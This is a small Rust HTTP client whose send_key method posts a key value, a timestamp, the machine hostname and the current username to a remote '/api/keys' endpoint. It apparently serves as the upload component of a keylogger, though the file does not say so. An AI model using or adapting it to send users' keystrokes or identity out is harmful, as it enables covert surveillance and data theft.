use reqwest::blocking::Client;
use serde_json::json;

pub struct ApiClient {
    client: Client,
    base_url: String,
}

impl ApiClient {
    pub fn new(base_url: &str) -> Self {
        Self {
            client: Client::new(),
            base_url: base_url.to_string(),
        }
    }

    pub fn send_key(&self, key: &str, timestamp: &str) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/api/keys", self.base_url);
        self.client.post(&url)
            .json(&json!({
                "key": key,
                "timestamp": timestamp,
                "machine": hostname::get()?.to_string_lossy(),
                "user": std::env::var("USER").unwrap_or("unknown".to_string())
            }))
            .send()?;
        Ok(())
    }
}
